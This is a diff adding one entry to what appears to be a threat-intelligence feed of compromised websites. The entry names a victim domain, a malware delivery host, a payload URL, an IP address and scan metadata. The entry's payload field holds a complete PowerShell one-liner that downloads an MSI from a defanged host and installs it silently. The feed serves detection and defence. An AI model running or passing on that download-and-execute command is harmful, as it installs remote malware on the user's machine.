@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "azkafoods.co",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "66.29.137.43"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwf2w2a00fkl0oml1ac8kcxp",
+    "ScannedAt": "2026-11-13T14:34:52.466000+00:00"
+  },
+  {
     "UrlDomain": "distinctiontraining.com.au",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
